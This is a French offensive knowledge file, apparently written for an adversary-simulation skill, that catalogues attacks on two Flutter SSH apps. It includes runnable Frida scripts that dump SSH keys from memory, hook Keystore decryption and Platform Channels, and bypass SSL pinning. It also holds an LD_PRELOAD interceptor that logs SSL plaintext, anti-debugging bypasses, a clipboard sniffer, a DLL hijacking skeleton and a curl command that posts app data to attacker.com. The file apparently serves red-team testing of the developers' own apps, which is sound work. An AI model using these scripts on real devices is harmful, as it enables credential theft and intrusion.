# Attaques Flutter/Dart -- Base de connaissances offensive
# Fichier knowledge pour le skill adversary-simulation
# Source : CYBERSEC_MOBILE.md + CYBERSEC_DESKTOP.md (recherche fevrier 2026)

> **Cibles** : ChillShell (app mobile Flutter/Dart, dartssh2) et Chill (app desktop Flutter + daemon Go tsnet)
> **Posture** : 100% offensive -- comment un attaquant exploite chaque surface

---

## TABLE DES MATIERES

1. [Reverse Engineering des apps Flutter](#1--reverse-engineering-des-apps-flutter)
2. [Attaques memoire -- Secrets dans le heap Dart](#2--attaques-memoire--secrets-dans-le-heap-dart)
3. [Interception des Platform Channels](#3--interception-des-platform-channels)
4. [Exploitation de flutter_pty](#4--exploitation-de-flutter_pty)
5. [Bypass SSL Pinning Flutter](#5--bypass-ssl-pinning-flutter)
6. [Attaques Tapjacking / Overlay](#6--attaques-tapjacking--overlay)
7. [Clipboard Sniffing](#7--clipboard-sniffing)
8. [Extraction flutter_secure_storage](#8--extraction-flutter_secure_storage)
9. [Attaques desktop specifiques Flutter](#9--attaques-desktop-specifiques-flutter)
10. [Bypass anti-debugging](#10--bypass-anti-debugging)
11. [Attaques dartssh2 -- protocole SSH](#11--attaques-dartssh2--protocole-ssh)
12. [Attaques Tailscale](#12--attaques-tailscale)
13. [Vecteurs supplementaires](#13--vecteurs-supplementaires)

---

## 1 -- Reverse Engineering des apps Flutter

### 1.1 Contexte : pourquoi Flutter est reversible

Flutter compile en AOT (Ahead-Of-Time) vers du code natif dans `libapp.so` (Android/Linux) ou des binaires Mach-O (iOS/macOS). Ce n'est PAS du bytecode Java/Kotlin -- les outils standards (jadx, apktool) ne fonctionnent pas. Mais des outils specialises existent et sont efficaces.

**Avantage structurel du desktop pour l'attaquant** : sur desktop, le binaire est directement accessible sur le filesystem (pas besoin d'extraire depuis un APK). Play Integrity et App Attest sont ABSENTS sur desktop.

### 1.2 Outil : Blutter (analyse statique)

**But** : Analyse statique de `libapp.so` pour extraire les objets Dart.

**Ce que Blutter extrait** :
- Noms de classes et signatures de methodes
- Chaines constantes (URLs, cles, tokens, chemins)
- Graphes de fonctions
- References aux packages (ex: `package:pointycastle`, `package:dartssh2`)
- Routines de chiffrement identifiables (ex: `encrypt_AES___paddedParams`)
- Initialisation des cles

**Blutter genere automatiquement des scripts Frida** pour l'instrumentation dynamique. L'attaquant obtient donc une cartographie complete du code + des hooks prets a l'emploi.

**Utilisation typique** :
```bash
# Extraire libapp.so depuis l'APK
unzip -o target.apk -d extracted/
cp extracted/lib/arm64-v8a/libapp.so .
cp extracted/lib/arm64-v8a/libflutter.so .

# Lancer Blutter
python3 blutter.py libapp.so output_dir/

# Resultats dans output_dir/ :
# - asm/ : desassemblage annote
# - ida_script/ : scripts IDA Pro
# - frida_script/ : hooks Frida pre-generes
# - objs.txt : tous les objets Dart
```

**Ce que l'attaquant cherche dans ChillShell/Chill** :
- Classes contenant "ssh", "key", "private", "secret", "token", "tailscale"
- Methodes de chiffrement/dechiffrement
- Constantes contenant des URLs Tailscale, des chemins de fichiers de config
- Routines de validation de certificats

### 1.3 Outil : reFlutter (patching dynamique)

**But** : Patcher `libflutter.so` pour inspecter la deserialisation des snapshots Dart.

**Capacites** :
- Identifie la version Flutter exacte via `snapshot_hash`
- Modifie le moteur Flutter pour intercepter les communications internes
- Utilise principalement pour **contourner le SSL pinning** (voir section 5)
- Peut injecter du code dans le moteur Flutter lui-meme

**Utilisation typique** :
```bash
# Installation
pip3 install reflutter

# Patcher l'APK -- genere un APK modifie avec le moteur Flutter patche
reflutter target.apk

# Le moteur patche redirige tout le trafic HTTPS vers un proxy
# (Burp Suite, mitmproxy) configure sur l'IP de l'attaquant
```

### 1.4 Outil : unflutter (extraction binaire)

**But** : Scanner les binaires ELF/Mach-O Flutter pour en extraire les donnees.

**Ce que unflutter extrait** :
- Chaines de caracteres depuis les snapshots Dart
- Pools d'objets
- Graphes de fonctions

**Applicable aux binaires desktop** (Linux ELF, macOS Mach-O, Windows PE) en plus des APKs.

### 1.5 Outils complementaires

- **Ghidra** : Desassembleur gratuit (NSA). Permet le patching statique de `libflutter.so` et `libapp.so`. Utile pour modifier les conditions de branchement (ex: forcer un `return true` sur la validation de certificat).
- **IDA Pro** : Desassembleur commercial. Scripts generes par Blutter pour annotation automatique.
- **Frida** : Instrumentation dynamique. Pivot central de la plupart des attaques Flutter (hooks, interception, modification en temps reel). Voir sections suivantes.

### 1.6 LLM-Assisted Reverse Engineering

Les attaquants utilisent ChatGPT/Claude/Gemini pour analyser le code assembleur extrait de `libapp.so`. **Plus facile sur desktop** car le binaire est directement accessible sur le filesystem. Le LLM accelere la comprehension des routines crypto et des machines d'etat SSH.

### 1.7 Ce que l'attaquant reconstruit

A partir de l'analyse combinee (Blutter + reFlutter + Frida + Ghidra) :
- **Architecture complete** : flux SSH, flux Tailscale, flux WOL, stockage des cles, biometrie
- **Secrets en dur** : cles, tokens, URLs, chemins de configuration
- **Logique de validation** : comment l'app verifie les certificats, les cles d'hote, les tokens
- **Points d'injection** : ou injecter du code pour intercepter les secrets au moment de leur utilisation

---

## 2 -- Attaques memoire -- Secrets dans le heap Dart

### 2.1 Le probleme fondamental du GC Dart

Le Garbage Collector de Dart **copie les objets** dans differentes zones du heap (young generation -> old generation). Une cle privee SSH stockee dans un objet `String` Dart :
- Est copiee plusieurs fois en memoire par le GC
- Persiste **indefiniment** meme apres que la reference soit supprimee
- N'est jamais zeroisee par le GC (il libere la memoire mais ne l'efface pas)

### 2.2 Technique : dump memoire via gdbserver

```bash
# Sur device roote ou en environnement de debug
# Attacher gdbserver au processus Flutter
gdbserver :1234 --attach $(pidof com.example.chillshell)

# Depuis la machine de l'attaquant
gdb -ex "target remote device_ip:1234"

# Dumper toute la heap
(gdb) dump memory heap_dump.bin 0x<heap_start> 0x<heap_end>

# Rechercher des motifs de cles privees
strings heap_dump.bin | grep -E "BEGIN (RSA|EC|OPENSSH) PRIVATE KEY"
strings heap_dump.bin | grep -E "AAAA[A-Za-z0-9+/]+" # Cles base64
```

### 2.3 Technique : extraction via Frida

```javascript
// Script Frida pour scanner la memoire du processus Flutter
// Recherche de cles privees SSH dans le heap

Process.enumerateRanges('rw-').forEach(function(range) {
    try {
        var pattern = "2d2d2d2d2d424547494e"; // "-----BEGIN" en hex
        Memory.scan(range.base, range.size, pattern, {
            onMatch: function(address, size) {
                console.log("[!] Cle privee trouvee a : " + address);
                console.log(Memory.readUtf8String(address, 2048));
            },
            onComplete: function() {}
        });
    } catch(e) {}
});
```

### 2.4 Technique : extraction via /proc (Linux desktop)

Sur l'app desktop Chill (Linux), le processus tourne sans sandbox :
```bash
# Lire la memoire du processus directement
cat /proc/$(pidof chill)/maps  # Cartographie memoire
# Dumper les segments rw (heap, stack)
dd if=/proc/$(pidof chill)/mem bs=1 skip=$((0xHEAP_START)) count=$((0xHEAP_SIZE)) of=dump.bin
# Chercher les secrets
strings dump.bin | grep -i "private\|secret\|key\|token\|tailscale"
```

### 2.5 Cibles specifiques en memoire

Dans ChillShell/Chill, l'attaquant cherche dans la RAM :
- **Cles privees SSH** : headers RSA/Ed25519, blobs base64
- **Tokens Tailscale** : chaines d'authentification du mesh
- **Mots de passe** : transmis via Platform Channels ou en argument SSH
- **Cles de session SSH** : materiel cryptographique derive pendant le handshake
- **Contenu des commandes** : historique des commandes executees via le terminal

### 2.6 Aggravation par flutter_foreground_task

Le service SSH en foreground (`flutter_foreground_task`) tourne **en permanence**. Consequences :
- La surface d'attaque memoire est **permanente** (pas juste pendant l'utilisation)
- Les fuites memoire accumulent les secrets au fil du temps
- Plus le service tourne longtemps, plus il y a de secrets residuels dans le heap

---

## 3 -- Interception des Platform Channels

### 3.1 Mecanisme

Flutter communique avec le code natif (Android/iOS/desktop) via les **Platform Channels**. Ces canaux transportent :
- Les commandes SSH a executer
- Les cles privees extraites de flutter_secure_storage
- Les tokens biometriques (resultat de local_auth)
- Les donnees de configuration Tailscale

### 3.2 Technique d'interception via Frida

```javascript
// Hook Platform Channel sur Android
// Intercepter les messages Dart -> natif et natif -> Dart

Java.perform(function() {
    // Hook FlutterJNI pour capturer les messages Platform Channel
    var FlutterJNI = Java.use("io.flutter.embedding.engine.FlutterJNI");

    FlutterJNI.handlePlatformMessage.implementation = function(channel, message, replyId) {
        console.log("[Platform Channel] Canal : " + channel);

        if (message != null) {
            // Decoder le ByteBuffer en string
            var byteArray = Java.array('byte', message.array());
            var decoded = "";
            for (var i = 0; i < byteArray.length; i++) {
                decoded += String.fromCharCode(byteArray[i] & 0xff);
            }
            console.log("[Platform Channel] Message : " + decoded);
        }

        // Appeler l'implementation originale (transparent pour l'app)
        return this.handlePlatformMessage(channel, message, replyId);
    };
});
```

### 3.3 Ce que l'attaquant capture

Sur ChillShell/Chill, les Platform Channels transportent :
- `flutter_secure_storage` : lectures/ecritures de cles SSH, tokens
- `local_auth` : resultats de verification biometrique (succes/echec)
- `dart:io` (desktop) : commandes systeme executees (`Process.run`)
- Messages custom entre Flutter et le daemon Go (tsnet) sur Chill desktop

### 3.4 Modification des messages

L'attaquant ne se contente pas d'ecouter -- il peut **modifier** les messages en transit :
- Changer le resultat biometrique de `false` a `true` (contourner l'authentification)
- Modifier les commandes SSH avant execution
- Injecter des cles SSH supplementaires dans le flux de stockage
- Alterer les parametres de configuration envoyes au daemon Go

---

## 4 -- Exploitation de flutter_pty

### 4.1 Nature du risque

`flutter_pty` donne acces a un **shell Android natif** directement depuis l'app Flutter. C'est un terminal complet sur le telephone.

### 4.2 Scenarios d'exploitation

**Si l'attaquant prend le controle de flutter_pty** (via Frida, exploitation d'une faille, ou acces physique) :

```bash
# Execution de commandes systeme arbitraires
ls /data/data/com.example.chillshell/
cat /data/data/com.example.chillshell/shared_prefs/*.xml

# Acces au filesystem de l'app
cat /data/data/com.example.chillshell/databases/*.db

# Si device roote : escalade de privileges
su -c "cat /data/data/com.example.chillshell/app_flutter/flutter_secure_storage/*"

# Exfiltration via reseau
curl -X POST https://attacker.com/exfil -d @/data/data/com.example.chillshell/files/config.json
```

### 4.3 Vecteurs d'acces a flutter_pty

- **Injection de commandes** : si l'app construit des commandes par concatenation de chaines sans validation
- **Input non valide** : si le PTY accepte des inputs de sources non verifiees (deep links, intents Android)
- **Frida hook** : rediriger les commandes du terminal SSH vers le shell local
- **Autre app malveillante** : interaction via IPC Android avec le service flutter_pty

---

## 5 -- Bypass SSL Pinning Flutter

### 5.1 Pourquoi les techniques classiques echouent

Flutter utilise **BoringSSL** embarque dans `libflutter.so`. Ce n'est PAS OkHttp3 (Java/Kotlin). Les hooks Frida classiques ciblant `javax.net.ssl` ou `okhttp3.CertificatePinner` **ne fonctionnent pas** sur Flutter.

### 5.2 Technique : patching libflutter.so via reFlutter

```bash
# reFlutter patche libflutter.so pour rediriger le trafic
reflutter target.apk

# Resultat : APK modifie avec moteur Flutter patche
# Le trafic HTTPS est redirige vers le proxy de l'attaquant
# La validation de certificat est desactivee dans le moteur
```

### 5.3 Technique : hook Frida sur BoringSSL

La cible est la fonction `ssl_crypto_x509_session_verify_cert_chain` dans `libflutter.so`. Frida force cette fonction a renvoyer `0x01` (vrai), desactivant toute validation de certificat.

```javascript
// Hook BoringSSL dans libflutter.so pour bypass SSL pinning
// Cible : ssl_crypto_x509_session_verify_cert_chain

function disablePinning() {
    var libflutter = Module.findBaseAddress("libflutter.so");
    if (!libflutter) {
        console.log("[-] libflutter.so non trouve");
        return;
    }

    // Rechercher la fonction de verification de certificat
    // Le pattern varie selon la version de Flutter
    // Utiliser reFlutter pour identifier le snapshot_hash et la version exacte

    // Methode generique : scanner pour le pattern de la fonction
    var pattern = "FF 03 05 D1"; // Prologue ARM64 typique
    Memory.scan(libflutter, Module.findModuleByName("libflutter.so").size, pattern, {
        onMatch: function(address, size) {
            // Verifier si c'est la bonne fonction (contexte SSL)
            // Forcer le retour a 0x01 (certificat valide)
            Interceptor.attach(address, {
                onLeave: function(retval) {
                    retval.replace(0x1);
                    console.log("[+] SSL verification bypassee");
                }
            });
        },
        onComplete: function() {}
    });
}

// Alternative : utiliser les offsets generes par Blutter
// Blutter identifie les fonctions SSL et genere les offsets exacts
```

### 5.4 Technique : patching statique via Ghidra

1. Ouvrir `libflutter.so` dans Ghidra
2. Localiser `ssl_crypto_x509_session_verify_cert_chain`
3. Modifier l'instruction de retour pour toujours renvoyer 1
4. Re-packager l'APK avec la bibliotheque modifiee
5. Signer avec un certificat auto-genere

### 5.5 Impact sur ChillShell/Chill

Avec le SSL pinning contourne :
- **Interception totale du trafic HTTPS** entre l'app et les services (Tailscale coordination, mises a jour, API)
- Capture des tokens d'authentification Tailscale
- Modification des reponses serveur en temps reel
- Injection de fausses mises a jour ou configurations

---

## 6 -- Attaques Tapjacking / Overlay

### 6.1 Mecanisme (Android uniquement)

Une app malveillante dessine une **fenetre transparente** par-dessus ChillShell pour capturer les touches. Flutter ne bloque pas toujours les evenements tactiles quand sa fenetre est partiellement obscurcie.

### 6.2 Scenario d'attaque

1. L'attaquant installe une app "innocente" (calculatrice, jeu) sur le telephone de la victime
2. L'app demande la permission `SYSTEM_ALERT_WINDOW` (overlay)
3. Quand ChillShell est ouvert, l'app malveillante dessine un overlay transparent
4. L'overlay capture les frappes : PIN, mots de passe SSH, commandes
5. Les touches sont transmises a ChillShell (l'utilisateur ne remarque rien)
6. L'app malveillante exfiltre les frappes vers le serveur de l'attaquant

### 6.3 Cibles prioritaires du tapjacking sur ChillShell

- **Ecran de saisie du PIN** : capture du code d'acces
- **Ecran de connexion SSH** : capture du mot de passe ou de la passphrase de la cle
- **Terminal SSH** : capture des commandes (y compris `sudo` avec mot de passe)
- **Ecran de configuration** : capture des parametres Tailscale

### 6.4 Detection de la vulnerabilite

Verifier si `MainActivity` a `rootView.setFilterTouchesWhenObscured(true)`. Si absent, l'app est vulnerable au tapjacking.

---

## 7 -- Clipboard Sniffing

### 7.1 Mecanisme

Toute app avec la permission de lecture du presse-papier peut lire ce que l'utilisateur copie. Sur les versions Android < 13, AUCUNE restriction.

### 7.2 Scenario d'attaque

1. L'utilisateur copie une cle SSH, un mot de passe ou un token depuis ChillShell
2. Une app malveillante en arriere-plan lit le presse-papier
3. Le secret est exfiltre

### 7.3 Specificite desktop (Chill)

Sur desktop, le clipboard est accessible a **TOUT processus** sans aucune restriction. Pas de protection native comme Android 13+. N'importe quel programme tournant sur le PC peut lire le clipboard en permanence.

```python
# Script Python minimal pour surveiller le clipboard (attaquant sur le meme desktop)
import time
try:
    import pyperclip
    last = ""
    while True:
        current = pyperclip.paste()
        if current != last:
            print(f"[CLIPBOARD] {current}")
            last = current
        time.sleep(0.5)
except ImportError:
    pass
```

### 7.4 Aggravation : capture d'ecran + clipboard

Combine avec une capture d'ecran (voir section 13.1), l'attaquant obtient a la fois le contenu visuel du terminal ET ce qui est copie/colle.

---

## 8 -- Extraction flutter_secure_storage

### 8.1 Mecanisme de stockage

`flutter_secure_storage` utilise :
- **Android** : Android Keystore + EncryptedSharedPreferences
- **iOS** : Keychain
- **Desktop** : varie (beaucoup moins securise)

### 8.2 Technique : device roote (Android)

```bash
# Sur device roote, acces direct au stockage de l'app
ls /data/data/com.example.chillshell/shared_prefs/
cat /data/data/com.example.chillshell/shared_prefs/FlutterSecureStorage.xml

# Les donnees sont chiffrees par le Keystore Android
# Mais sur un device roote, le Keystore est compromis
```

### 8.3 Technique : hooks Frida sur Keystore

```javascript
// Hook Android Keystore pour intercepter les operations de dechiffrement
Java.perform(function() {
    var Cipher = Java.use("javax.crypto.Cipher");

    // Intercepter doFinal (dechiffrement)
    Cipher.doFinal.overload("[B").implementation = function(input) {
        var result = this.doFinal(input);
        console.log("[Keystore] Donnee dechiffree : " +
            Java.use("java.util.Arrays").toString(result));

        // Convertir en string pour voir si c'est une cle SSH
        var str = "";
        for (var i = 0; i < result.length; i++) {
            str += String.fromCharCode(result[i] & 0xff);
        }
        console.log("[Keystore] Texte : " + str);

        return result;
    };
});
```

### 8.4 Technique : extraction via RAM

Meme si les cles sont stockees de maniere securisee, elles **apparaissent en clair dans la RAM** au moment de l'utilisation par dartssh2 :

1. La cle est lue depuis flutter_secure_storage (dechiffree par le Keystore)
2. Elle est transferee via Platform Channel vers le code Dart
3. Elle est stockee dans un objet Dart (heap du GC)
4. Elle est utilisee par dartssh2 pour la signature SSH
5. **A chaque etape**, la cle est en clair en memoire

L'attaquant n'a qu'a dumper la memoire au bon moment (voir section 2).

### 8.5 Specificite desktop (Chill) -- stockage FAIBLE

Sur desktop, il n'y a **PAS de Secure Enclave ni de StrongBox**. Les alternatives sont :
- **Windows** : Credential Manager (via Platform Channels) -- accessible a tout processus admin
- **Linux** : libsecret / GNOME Keyring -- protege par le mot de passe de session
- **macOS** : Keychain -- relativement securise mais accessible apres deverrouillage

**Les cles sur desktop sont significativement plus vulnerables que sur mobile.** Un attaquant avec acces utilisateur au PC peut potentiellement extraire les cles sans elevation de privileges.

### 8.6 Backup Extraction

Les cles dans flutter_secure_storage peuvent se retrouver dans les backups :
- **Android** : ADB backup (`adb backup com.example.chillshell`), Google Drive
- **iOS** : iTunes, iCloud

Si `android:allowBackup="true"` dans le manifest (defaut), un attaquant avec acces USB extrait les cles via ADB.

---

## 9 -- Attaques desktop specifiques Flutter

### 9.1 ABSENCE DE SANDBOX -- Acces filesystem complet

**C'est le point critique numero 1 du desktop.** Contrairement au mobile, les apps Flutter Desktop n'ont **PAS de sandbox**. L'app tourne avec les memes privileges que l'utilisateur.

Si l'app Chill est compromise, l'attaquant accede a :
- `~/.ssh/` : toutes les cles SSH de l'utilisateur (pas seulement celles de l'app)
- Credentials WiFi stockes par l'OS
- Tokens de session d'autres apps (navigateurs, clients email, etc.)
- Keystores locaux
- Documents, downloads, fichiers personnels

### 9.2 DLL Injection / Side-Loading (Windows)

**Mecanisme** : L'ordre de recherche des DLL sur Windows est un vecteur classique. Si l'executable Flutter ou ses dependances appelle `LoadLibrary` sans chemin complet, Windows cherche dans le **repertoire actuel AVANT les repertoires systeme**.

**Exploitation** :
```
1. Identifier les DLLs chargees par l'app Chill (Process Monitor / procmon)
2. Identifier celles chargees sans chemin absolu
3. Placer une DLL malveillante (version.dll, dwmapi.dll, etc.) dans le dossier de l'app
4. Au prochain lancement, le code de l'attaquant est charge DANS le processus de l'app
```

**DLLs typiquement detournables** :
- `version.dll`
- `dwmapi.dll`
- `uxtheme.dll`
- Toute DLL chargee via le pont FFI de Flutter

**Impact specifique** : si le pont FFI charge une bibliotheque detournable, l'attaquant accede directement a `flutter_secure_storage` et aux cles SSH depuis l'interieur du processus.

```c
// Exemple de DLL malveillante (version.dll)
// Compile avec : cl /LD malicious_version.c /Fe:version.dll

#include <windows.h>

// Fonctions proxy vers la vraie version.dll
// ...

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Code malveillant execute dans le contexte du processus Chill
        // Acces direct a la memoire du processus (cles SSH, tokens)
        // Injection de hooks sur les fonctions crypto
        // Exfiltration des secrets
    }
    return TRUE;
}
```

### 9.3 LD_PRELOAD (Linux)

**Mecanisme** : `LD_PRELOAD` force le chargement d'un objet partage **avant tous les autres**. L'attaquant intercepte les appels a glibc ou libssl.

**Exploitation** :
```bash
# Creer une bibliotheque malveillante qui intercepte les appels SSL
# Compile : gcc -shared -fPIC -o evil.so evil.c -ldl

# Lancer l'app avec la bibliotheque injectee
LD_PRELOAD=/tmp/evil.so /opt/chill/chill
```

```c
// evil.c -- Intercepte les appels SSL_write pour capturer le trafic SSH
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>

// Intercepter SSL_write pour capturer les donnees avant chiffrement
int SSL_write(void *ssl, const void *buf, int num) {
    // Logger les donnees en clair (commandes SSH, cles, etc.)
    FILE *f = fopen("/tmp/.exfil.log", "a");
    if (f) {
        fwrite(buf, 1, num, f);
        fclose(f);
    }
    // Appeler la vraie fonction
    int (*real_SSL_write)(void*, const void*, int) = dlsym(RTLD_NEXT, "SSL_write");
    return real_SSL_write(ssl, buf, num);
}
```

**Impact** : brise le chiffrement SSH **avant qu'il ne quitte l'app**. L'attaquant capture les commandes en clair, les cles, les tokens.

### 9.4 DYLD_INSERT_LIBRARIES (macOS)

Equivalent macOS de `LD_PRELOAD` :
```bash
DYLD_INSERT_LIBRARIES=/tmp/evil.dylib /Applications/Chill.app/Contents/MacOS/chill
```

Meme principe : interception des appels systeme et crypto avant qu'ils ne quittent le processus.

### 9.5 Attaques IPC -- Named Pipes, Unix Sockets, D-Bus

Sur desktop, Flutter utilise des mecanismes IPC natifs. Un processus local malveillant peut ecouter ou injecter des commandes via :
- **Windows** : Named pipes
- **Linux** : Unix sockets, D-Bus
- **macOS** : XPC, Mach ports

**Exploitation D-Bus (Linux)** :
```bash
# Lister les services D-Bus exposes
dbus-monitor --session
# Identifier les services de l'app Chill
busctl list | grep -i chill

# Si l'app expose un service D-Bus, l'attaquant peut :
# - Ecouter les messages (commandes SSH, resultats)
# - Injecter des commandes
# - Modifier les parametres de configuration
```

**Exploitation Named Pipes (Windows)** :
```powershell
# Lister les pipes ouverts
[System.IO.Directory]::GetFiles("\\.\pipe\")
# Identifier ceux de l'app Chill et s'y connecter
```

### 9.6 Manipulation de fichiers de configuration

L'app desktop Chill configure l'OS (sshd_config, pare-feu, WOL, fast boot). Si un attaquant intercepte les parametres de configuration envoyes par le mobile :

**Modifications malveillantes** :
- `sshd_config` : activer root login, ajouter cle attaquant aux authorized_keys, desactiver le pare-feu
- Regles firewall : ouvrir des ports supplementaires
- WOL : activer le reveil a distance sans restriction
- Fast boot : desactiver Secure Boot

**Vecteur** : l'app a souvent des **privileges eleves** (`pkexec` sur Linux, `RunAs` sur Windows, `osascript` sur macOS) pour configurer l'OS. Si le canal mobile -> desktop est compromis, l'attaquant herite de ces privileges.

### 9.7 Reverse Engineering facilite sur desktop

Meme outils que mobile (Blutter, reFlutter, Ghidra, IDA Pro), mais **PLUS FACILE** car :
- Le binaire est directement accessible sur le filesystem
- Pas de protection de l'OS (Play Integrity, App Attest sont absents)
- L'obfuscation est moins efficace sans ces protections materielles
- Le debugger peut etre attache librement (pas de verification d'integrite de l'app store)

### 9.8 CVEs Windows exploitables en chaine (Janvier 2026)

Chaine d'exploitation specifique au desktop Windows :
1. **CVE-2026-20805** (DWM) : fuite d'adresses memoire ALPC -> casse ASLR. Exploite activement.
2. **CVE-2026-20854** (LSASS) : Use-After-Free -> RCE via reseau. Hashes NTLM exposes.
3. **CVE-2026-20822** (Graphics) : Use-After-Free -> privileges SYSTEM.
4. **CVE-2026-20876** (VBS Enclave) : Buffer Overflow -> acces Virtual Trust Level 2.
5. **CVE-2026-21265** (Secure Boot) : expiration certificat -> contournement Secure Boot.

**Chaine complete** : DWM (fuite ASLR) + LSASS (RCE) = compromission totale du poste Windows executant Chill.

---

## 10 -- Bypass anti-debugging

### 10.1 Techniques anti-debugging courantes

Les apps Flutter/Dart peuvent implementer :
- **Android** : detection de Frida via `/proc/self/maps` (recherche de `frida-agent.so`)
- **Desktop Windows** : `IsDebuggerPresent()`, `CheckRemoteDebuggerPresent()`
- **Desktop Linux** : detection via `ptrace`
- **freeRASP / Talsec** : SDK detectant root, hooks Frida, debugger, tampering binaire

### 10.2 Bypass detection Frida

```javascript
// Contourner la detection de Frida par l'app
// L'app scanne /proc/self/maps pour trouver frida-agent.so

Interceptor.attach(Module.findExportByName("libc.so", "fopen"), {
    onEnter: function(args) {
        var path = Memory.readUtf8String(args[0]);
        if (path && path.indexOf("/proc/self/maps") >= 0) {
            // Rediriger vers un faux fichier sans mention de frida
            this.should_fake = true;
        }
    },
    onLeave: function(retval) {
        if (this.should_fake) {
            // L'app lira un fichier maps "propre" sans frida-agent.so
            // Technique : creer un fichier filtre en avance
        }
    }
});

// Alternative : renommer frida-server en autre chose
// et utiliser frida en mode "stalker" (plus discret)
```

### 10.3 Bypass ptrace (Linux desktop)

```c
// Sur Linux, l'app peut utiliser ptrace(PTRACE_TRACEME) pour empecher
// l'attachement d'un debugger.
// Bypass : LD_PRELOAD avec une fausse implementation de ptrace

#define _GNU_SOURCE
#include <sys/ptrace.h>
#include <dlfcn.h>

long ptrace(int request, ...) {
    // Si l'app verifie PTRACE_TRACEME, retourner succes sans rien faire
    if (request == PTRACE_TRACEME) {
        return 0; // Succes factice
    }
    // Sinon, appeler la vraie fonction
    long (*real_ptrace)(int, ...) = dlsym(RTLD_NEXT, "ptrace");
    return real_ptrace(request);
}
```

### 10.4 Bypass IsDebuggerPresent (Windows desktop)

```c
// Patch en memoire de IsDebuggerPresent
// Ou utiliser x64dbg avec le plugin ScyllaHide qui neutralise
// toutes les detections anti-debug automatiquement
```

### 10.5 Bypass freeRASP / Talsec

freeRASP detecte : hooks Frida, root/Magisk, debugger, tampering binaire. Techniques de contournement :
- **Magisk Hide / Zygisk** : cache le root aux apps
- **Frida Gadget** : injection via repackaging au lieu du serveur Frida (plus discret)
- **Patching binaire** : modifier les callbacks freeRASP dans `libapp.so` pour qu'ils ne fassent rien (NOP les appels)
- **Timing attack** : les verifications RASP s'executent au demarrage. Attacher Frida APRES les verifications.

### 10.6 Bypass verification d'integrite du binaire

Si l'app verifie le hash SHA-256 de `libapp.so`/`libflutter.so` :
- Intercepter la fonction de lecture du fichier pour retourner le hash du binaire original
- Ou modifier le hash de reference en memoire avant la comparaison

---

## 11 -- Attaques dartssh2 -- protocole SSH

### 11.1 Surface d'attaque critique

dartssh2 est une implementation SSH **pure Dart** (PAS un wrapper OpenSSH). 229 stars, 67 forks sur GitHub. **Aucun audit de securite publie.** Le package implemente le protocole SSH2 from scratch :
- Key exchange
- Host key verification
- Authentication
- Channel multiplexing
- SFTP

### 11.2 Attaque Terrapin (CVE-2023-48795)

Troncature de prefixe ciblant la couche de transport SSH. Exploite la phase de key exchange ou les numeros de sequence ne sont pas encore verifies cryptographiquement. Un MITM insere ou supprime des messages comme `EXT_INFO` (RFC 8308).

**Pertinence dartssh2 CRITIQUE** : dartssh2 DOIT supporter l'extension "Strict KEX" (RFC 9308) qui reinitialise les numeros de sequence. L'absence du support `kex-strict-c-v00@openssh.com` laisse la connexion vulnerable.

**Impact** : desactivation de l'obscurcissement du timing des frappes, imposition d'algorithmes plus faibles.

### 11.3 SSH Protocol Downgrade Attack

Forcer le client ou le serveur a utiliser des algorithmes plus faibles. Si dartssh2 supporte par defaut des algorithmes obsoletes :
- `diffie-hellman-group1-sha1`
- `ssh-rsa` (SHA1)
- `arcfour`

Un MITM manipule la negociation pour imposer un algorithme cassable.

### 11.4 Machine d'etat SSH vulnerable

Le code de la machine d'etat SSH dans dartssh2 peut avoir des **interruptions mal gerees durant le handshake** permettant l'injection de paquets hors sequence. Risque de "Rogue Extension Negotiation" similaire aux failles AsyncSSH.

### 11.5 Session rekey absent

dartssh2 ne garantit pas le **rekey automatique** de la session SSH. Consequence : la meme cle de session peut etre utilisee pour toute la duree de la connexion. Si la cle est compromise, tout le trafic passe et futur est dechiffrable.

### 11.6 Channel multiplexing exploitation

dartssh2 supporte le multiplexage de canaux SSH. Injection de donnees inter-canaux possible si l'isolation n'est pas stricte.

### 11.7 SSH Banner Fingerprinting

La banniere SSH de dartssh2 revele que c'est une app Flutter, pas un client standard. Un attaquant identifie immediatement la stack technique et adapte son attaque.

```bash
# Scanner la banniere SSH
nc target_ip 22
# Reponse : SSH-2.0-dartssh_2.x
# L'attaquant sait maintenant que c'est une app Flutter avec dartssh2
```

### 11.8 CVEs OpenSSH exploitables via dartssh2

Bien que dartssh2 ne soit pas OpenSSH, les SERVEURS SSH cibles sont souvent OpenSSH :

- **CVE-2025-26465** : VerifyHostKeyDNS MITM -- forcer le client a accepter une cle d'hote malveillante via epuisement memoire
- **CVE-2025-26466** : DoS pre-authentification -- saturation par SSH2_MSG_PING, complexite O(n2)
- **CVE-2025-61984** : ProxyCommand RCE -- injection dans le username
- **CVE-2024-6387 "regreSSHion"** : Race condition -> RCE root sur le serveur (nation-state)

### 11.9 Dependances transitives vulnerables

dartssh2 depend de :
- **pointycastle** : PointyCastle < 3.4.0 avait des fuites temporelles dans GCM (`validateMac`). AESFastEngine vulnerable aux attaques par cache CPU (T-tables).
- **pinenacl** : pas d'audit connu
- **cryptography** : a verifier

### 11.10 SSH Keepalive Timing Analysis

Les keepalive SSH trahissent la presence d'une session active meme sans activite utilisateur. Les patterns de trafic chiffre (taille, frequence) permettent d'inferer les actions. En 2026, l'IA correle les micro-variations de latence sur 5G-Advanced pour reconstruire les frappes clavier.

### 11.11 SSH Agent Forwarding Abuse (desktop)

Si l'app desktop utilise l'agent forwarding, un serveur compromis utilise l'agent de l'utilisateur pour se connecter a d'autres machines. Le desktop bridge devient un pivot vers tout le LAN.

### 11.12 SSH Tunneling & Port Forwarding Abuse (desktop)

Si dartssh2 supporte le tunneling par defaut, un serveur malveillant peut demander au client d'ouvrir un tunnel inverse. Le desktop bridge Chill devient un pivot vers le reseau local.

---

## 12 -- Attaques Tailscale

### 12.1 TS-2026-001 -- RCE root via tssentineld (macOS)

- **Versions** : Tailscale 1.84.0 a 1.92.3 (macOS standalone)
- Service `tssentineld` (root) utilise `NSTask` avec `/bin/sh -c sudo -u [username]`. Substitution de chaine non securisee permet injection de commandes shell avec privileges root.

### 12.2 TS-2025-008 -- Tailnet Lock bypass sans --statedir

Noeuds sans repertoire d'etat defini echouent a charger la liste des signataires de confiance TKA. Le daemon **ignore les verifications** au lieu de bloquer. Noeuds non autorises s'inserent dans le mesh.

**Exploitation specifique a Chill** : si le daemon Go (tsnet) ne configure pas `--statedir` ou `TS_STATE_DIR`, un attaquant insere un noeud malveillant dans le tailnet.

